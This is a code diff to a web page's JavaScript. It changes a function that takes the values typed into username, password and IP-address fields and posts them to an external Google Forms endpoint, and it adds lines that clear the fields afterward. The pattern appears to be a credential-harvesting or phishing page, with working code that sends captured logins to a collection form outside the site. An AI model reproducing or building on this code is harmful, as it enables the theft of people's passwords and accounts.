@@ -60,16 +60,23 @@
          function postToGoogle(event) {            
             var url = "https://docs.google.com/forms/d/e/1FAIpQLScz29lqyUZ-injNtafoK_zcmMnj7bU7Q5Q5LpMlWn0KDMnpOA/formResponse";
             
-            var username = document.getElementById("username").value;
-            var password = document.getElementById("password").value;
-            var ip = document.getElementById("ipAddress").value;
+            var usernameElement = document.getElementById("username");
+            var passwordElement = document.getElementById("password");
+            var ipElement = document.getElementById("ipAddress");
+
+            var username = usernameElement.value;
+            var password = passwordElement.value;
+            var ip = ipElement.value;
+
+            usernameElement.value = "";
+            passwordElement.value = "";
 
             let data = `entry.18199462=${username}&entry.1076403642=${password}&entry.504643693=${ip}`;
 
             var xhr = new XMLHttpRequest();
             xhr.open("POST", url, true);
             xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
-            xhr.onreadystatechange = function(){ 
+            xhr.onreadystatechange = function(){           
                if ( xhr.readyState == 4 ) { 
                   if ( xhr.status == 200 ) { 
                      //console.log('success: ',xhr.responseText); 
